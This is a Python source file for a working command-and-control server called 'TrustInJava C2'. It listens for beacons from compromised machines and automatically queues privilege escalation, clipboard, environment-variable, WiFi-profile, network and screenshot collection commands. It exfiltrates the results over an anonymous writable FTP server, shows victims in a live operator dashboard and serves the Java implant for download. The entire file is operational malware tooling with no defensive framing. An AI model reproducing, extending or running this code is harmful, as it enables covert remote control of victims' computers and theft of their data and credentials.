import socket
import threading
import base64
import time
import os
from datetime import datetime
from flask import Flask, render_template, request, jsonify, send_file
from flask_socketio import SocketIO, emit
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer

app = Flask(__name__)
app.config['SECRET_KEY'] = 'trustinjava-c2-secret'
socketio = SocketIO(app, cors_allowed_origins="*")

agents = {}
agent_commands = {}
agent_results = {}
agent_screenshots = {}
agent_profiles = {}

FTP_DIR = os.path.join(os.path.dirname(__file__), 'ftp_files')
SCREENSHOTS_DIR = os.path.join(FTP_DIR, 'screenshots')
os.makedirs(SCREENSHOTS_DIR, exist_ok=True)

class AgentHandler(threading.Thread):
    def __init__(self, client_socket, address):
        threading.Thread.__init__(self)
        self.client_socket = client_socket
        self.address = address
        self.daemon = True
        
    def run(self):
        try:
            raw_chunks = []
            while True:
                chunk = self.client_socket.recv(65536)
                if not chunk:
                    break
                raw_chunks.append(chunk)
                joined = b''.join(raw_chunks)
                if b'Connection: close\r\n\r\n' in joined or b'\r\n\r\n' in joined:
                    break
            data = b''.join(raw_chunks).decode('utf-8', errors='ignore')
            
            if '/agent/&' in data:
                encoded_data = data.split('/agent/&')[1].split(' HTTP')[0]
                try:
                    decoded_data = base64.b64decode(encoded_data).decode('utf-8')
                    parts = decoded_data.split('&')
                    
                    if len(parts) >= 7:
                        computer_id = parts[0]
                        agent_ip = parts[3]
                        
                        if parts[4] == "Waiting for commands":
                            message = parts[4]
                            os_name = parts[6] if len(parts) > 6 else "Unknown"
                            stage = parts[7] if len(parts) > 7 else "Agent"
                        else:
                            os_name = parts[4]
                            message = parts[6] if len(parts) > 6 else ""
                            stage = parts[7] if len(parts) > 7 else "Agent"
                        
                        if computer_id not in agents:
                            agents[computer_id] = {
                                'id': computer_id,
                                'ip': agent_ip,
                                'os': os_name,
                                'stage': stage,
                                'last_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                                'first_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                                'address': self.address[0]
                            }
                            print(f"[+] New agent registered: {computer_id} from {agent_ip}")
                            
                            if computer_id not in agent_profiles:
                                agent_profiles[computer_id] = {
                                    'id': computer_id,
                                    'ip': agent_ip,
                                    'os': os_name,
                                    'first_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                                    'user': '',
                                    'current_path': '',
                                    'drives': '',
                                    'system_info': '',
                                    'processes': '',
                                    'jvms': '',
                                    'screenshot': '',
                                    'clipboard': '',
                                    'env_vars': '',
                                    'net_connections': '',
                                    'arp_table': '',
                                    'wifi_profiles': ''
                                }
                            
                            if computer_id not in agent_commands:
                                agent_commands[computer_id] = []
                            
                            initial_commands = [
                                'escalate', 'getuid', 'currentpath', 'drives', 'systeminfo',
                                'listproc', 'listJVMs', 'screenshot',
                                'clipboard', 'envvars', 'netconn', 'arp', 'wifi_profiles'
                            ]
                            agent_commands[computer_id].extend(initial_commands)
                            print(f"[*] Auto-queued {len(initial_commands)} initial commands for {computer_id}")
                            socketio.emit('new_agent', agents[computer_id])
                        else:
                            agents[computer_id]['last_seen'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                            agents[computer_id]['stage'] = stage
                        
                        if message and message != "Waiting for commands":
                            if computer_id not in agent_results:
                                agent_results[computer_id] = []
                            agent_results[computer_id].append({
                                'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                                'output': message
                            })
                            
                            if computer_id in agent_profiles:
                                if '[*] System info requested:' in message or 'Operating system architecture:' in message:
                                    agent_profiles[computer_id]['system_info'] = message
                                    for line in message.split('\n'):
                                        if 'User account name:' in line:
                                            username = line.split('User account name:')[1].strip()
                                            if username:
                                                agent_profiles[computer_id]['user'] = username
                                            break
                                        if 'User working directory:' in line:
                                            path = line.split('User working directory:')[1].strip()
                                            if path and not agent_profiles[computer_id]['current_path']:
                                                agent_profiles[computer_id]['current_path'] = path
                                elif len(message.strip()) < 50 and not message.startswith('[') and not agent_profiles[computer_id]['user']:
                                    agent_profiles[computer_id]['user'] = message.strip()
                                elif (message.startswith('C:\\') or message.startswith('/')) and len(message) < 300:
                                    agent_profiles[computer_id]['current_path'] = message.strip()
                                elif 'Drive Name:' in message or ('Total space:' in message and 'Free space:' in message):
                                    agent_profiles[computer_id]['drives'] = message
                                elif message.startswith('[*] Clipboard'):
                                    agent_profiles[computer_id]['clipboard'] = message
                                    socketio.emit('profile_update', {
                                        'agent_id': computer_id, 'field': 'clipboard', 'value': message
                                    })
                                elif message.startswith('[*] Environment Variables'):
                                    agent_profiles[computer_id]['env_vars'] = message
                                    socketio.emit('profile_update', {
                                        'agent_id': computer_id, 'field': 'env_vars', 'value': message
                                    })
                                elif message.startswith('[*] Network Connections'):
                                    agent_profiles[computer_id]['net_connections'] = message
                                    socketio.emit('profile_update', {
                                        'agent_id': computer_id, 'field': 'net_connections', 'value': message
                                    })
                                elif message.startswith('[*] ARP Table') or message.startswith('[*] ARP'):
                                    agent_profiles[computer_id]['arp_table'] = message
                                    socketio.emit('profile_update', {
                                        'agent_id': computer_id, 'field': 'arp_table', 'value': message
                                    })
                                elif message.startswith('[*] WiFi'):
                                    agent_profiles[computer_id]['wifi_profiles'] = message
                                    socketio.emit('profile_update', {
                                        'agent_id': computer_id, 'field': 'wifi_profiles', 'value': message
                                    })
                                elif '"Image Name"' in message or ('PID:' in message and ('CMD:' in message or 'Name:' in message)):
                                    agent_profiles[computer_id]['processes'] = message
                                elif ('@' in message and len(message) < 200) or 'JVM' in message.upper() or ('PID:' in message and ' - ' in message):
                                    agent_profiles[computer_id]['jvms'] = message
                            socketio.emit('agent_result', {
                                'agent_id': computer_id,
                                'result': message,
                                'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                            })
                            print(f"[*] Result from {computer_id}: {message[:100]}...")
                        
                        response_command = ""
                        if parts[4] == "Waiting for commands":
                            if computer_id in agent_commands and agent_commands[computer_id]:
                                response_command = agent_commands[computer_id].pop(0)
                                print(f"[>] Sending command to {computer_id}: {response_command}")
                        
                        response = f"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\nOS={response_command}*_*"
                        self.client_socket.sendall(response.encode())
                        
                except Exception as e:
                    print(f"[!] Error decoding agent data: {e}")
            
        except Exception as e:
            print(f"[!] Error handling agent: {e}")
        finally:
            self.client_socket.close()


def agent_listener(port=4444):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', port))
    server.listen(5)
    print(f"[*] Agent listener started on port {port}")
    
    while True:
        try:
            client, address = server.accept()
            print(f"[*] Connection from {address}")
            handler = AgentHandler(client, address)
            handler.start()
        except Exception as e:
            print(f"[!] Error accepting connection: {e}")


@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/agents', methods=['GET'])
def get_agents():
    result = []
    for agent_id, agent in agents.items():
        merged = dict(agent)
        if agent_id in agent_profiles:
            merged['user'] = agent_profiles[agent_id].get('user', '')
        result.append(merged)
    return jsonify(result)

@app.route('/api/agent/<agent_id>/command', methods=['POST'])
def send_command(agent_id):
    data = request.json
    command = data.get('command', '')
    
    if agent_id not in agents:
        return jsonify({'error': 'Agent not found'}), 404
    
    if agent_id not in agent_commands:
        agent_commands[agent_id] = []
    
    agent_commands[agent_id].append(command)
    
    return jsonify({'status': 'Command queued', 'command': command})

@app.route('/api/agent/<agent_id>/results', methods=['GET'])
def get_results(agent_id):
    if agent_id not in agent_results:
        return jsonify([])
    return jsonify(agent_results[agent_id])

@app.route('/api/agent/<agent_id>/profile', methods=['GET'])
def get_agent_profile(agent_id):
    if agent_id not in agent_profiles:
        return jsonify({})
    return jsonify(agent_profiles[agent_id])

@app.route('/api/agent/<agent_id>/screenshots', methods=['GET'])
def get_screenshots(agent_id):
    if agent_id not in agent_screenshots:
        return jsonify([])
    return jsonify(agent_screenshots[agent_id])

@app.route('/api/screenshot/<filename>', methods=['GET'])
def get_screenshot_file(filename):
    filepath = os.path.join(SCREENSHOTS_DIR, filename)
    if os.path.exists(filepath):
        return send_file(filepath, mimetype='image/png')
    return jsonify({'error': 'Screenshot not found'}), 404

@app.route('/api/generate-config', methods=['POST'])
def generate_config():
    from flask import Response
    data = request.json or {}
    ip   = data.get('ip',   '127.0.0.1')
    port = data.get('port', '4444')
    content = f"{ip}\n{port}"
    return Response(content, mimetype='text/plain',
        headers={'Content-Disposition': 'attachment; filename=config.ep'})

@app.route('/download/agent-jar', methods=['GET'])
def download_jar():
    jar_path = os.path.abspath(os.path.join(os.path.dirname(__file__),
        '..', 'JavaAgent.jar.src', 'dist', 'RemoteAgent.jar'))
    if os.path.exists(jar_path):
        return send_file(jar_path, as_attachment=True, download_name='RemoteAgent.jar')
    return jsonify({'error': 'JAR not found. Build it first with build.ps1'}), 404

@socketio.on('connect')
def handle_connect():
    print('[*] Web client connected')
    emit('agents_list', list(agents.values()))

def ftp_server():
    try:
        authorizer = DummyAuthorizer()
        authorizer.add_anonymous(FTP_DIR, perm='elradfmw')
        
        handler = FTPHandler
        handler.authorizer = authorizer
        handler.banner = "FTP Server Ready"
        
        server = FTPServer(('0.0.0.0', 2121), handler)
        server.max_cons = 256
        server.max_cons_per_ip = 5
        
        print("[*] FTP server started on port 2121")
        server.serve_forever()
    except Exception as e:
        print(f"[!] FTP server error: {e}")

def monitor_screenshots():
    import glob
    seen_files = set()
    
    while True:
        try:
            png_files = glob.glob(os.path.join(SCREENSHOTS_DIR, '*.png'))
            
            for filepath in png_files:
                filename = os.path.basename(filepath)
                
                if filename not in seen_files:
                    seen_files.add(filename)
                    print(f"[+] Screenshot detected: {filename}")
                    
                    if agents:
                        agent_id = max(agents.keys(), key=lambda x: agents[x].get('last_seen', ''))
                        if agent_id not in agent_screenshots:
                            agent_screenshots[agent_id] = []
                        
                        screenshot_data = {
                            'filename': filename,
                            'url': f'/api/screenshot/{filename}',
                            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                        }
                        agent_screenshots[agent_id].append(screenshot_data)
                        print(f"[+] Screenshot assigned to agent: {agent_id}")
                        
                        if agent_id in agent_profiles:
                            agent_profiles[agent_id]['screenshot'] = f'/api/screenshot/{filename}'
                        
                        socketio.emit('screenshot_update', {
                            'agent_id': agent_id,
                            'screenshot': screenshot_data
                        })
                    else:
                        print(f"[!] No agents available to assign screenshot")
            
            time.sleep(2)
        except Exception as e:
            print(f"[!] Screenshot monitor error: {e}")
            time.sleep(5)

if __name__ == '__main__':
    ftp_thread = threading.Thread(target=ftp_server, daemon=True)
    ftp_thread.start()
    
    monitor_thread = threading.Thread(target=monitor_screenshots, daemon=True)
    monitor_thread.start()
    
    listener_thread = threading.Thread(target=agent_listener, args=(4444,), daemon=True)
    listener_thread.start()
    
    print("[*] Starting TrustInJava C2 web interface on http://0.0.0.0:5000")
    socketio.run(app, host='0.0.0.0', port=5000, debug=False)
